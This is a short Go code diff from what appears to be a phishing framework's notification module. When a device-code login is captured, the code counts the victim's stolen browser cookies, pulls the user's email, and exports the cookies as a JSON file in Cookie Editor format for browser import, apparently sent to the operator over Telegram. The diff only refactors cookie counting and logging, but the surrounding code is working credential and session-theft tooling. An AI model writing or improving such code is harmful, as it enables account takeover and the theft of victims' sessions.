@@ -1112,11 +1112,12 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		text += fmt.Sprintf("    Country:- %s", geoInfo.Country)
 
 	case EventDeviceCodeCaptured:
-		// Log incoming cookie count
-		log.Info("[telegram-dc] EventDeviceCodeCaptured triggered - data.Cookies has %d domains", len(data.Cookies))
-		for domain, cookies := range data.Cookies {
-			log.Debug("[telegram-dc] Domain %s: %d cookies", domain, len(cookies))
+		// Count cookies
+		cookieCount := 0
+		for _, cookies := range data.Cookies {
+			cookieCount += len(cookies)
 		}
+		log.Info("[telegram-dc] Processing device code capture: %d cookies from %d domains", cookieCount, len(data.Cookies))
 		
 		// Get user info from custom fields
 		userEmail := ""
@@ -1175,8 +1176,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		}
 
 		// 2. Send COOKIES file (.json) - Cookie Editor format for browser import
-		log.Info("[telegram-dc] Checking cookies for JSON export: %d domains", len(data.Cookies))
-		if len(data.Cookies) > 0 {
+		if cookieCount > 0 {
 			type CookieEditorFormat struct {
 				Path           string `json:"path"`
 				Domain         string `json:"domain"`
